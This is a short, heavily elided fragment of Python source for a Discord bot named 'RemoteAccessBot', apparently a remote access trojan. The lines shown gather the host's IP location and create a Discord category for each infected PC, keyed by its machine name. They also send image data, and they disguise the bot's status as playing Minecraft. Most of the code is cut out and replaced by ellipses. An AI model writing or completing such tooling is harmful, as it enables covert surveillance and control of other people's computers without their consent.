# RemoteAccessBot developers: @soacy
...
def get_ip_info(): # Grabbing location info
    try:
    ...
    for category in guild.categories:
        if category.name == pc_name:
            ...
            with io.BytesIO() as image_binary:
                ...
                embed.set_author(name="RemoteAccessBot")
...
async def on_ready(): # Main stuff
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name="Minecraft")) # You can also change what the bots activity is!
    guild = client.guilds[0]
    pc_name = platform.node()
    existing_category = discord.utils.get(guild.categories, name=pc_name)
    if not existing_category:
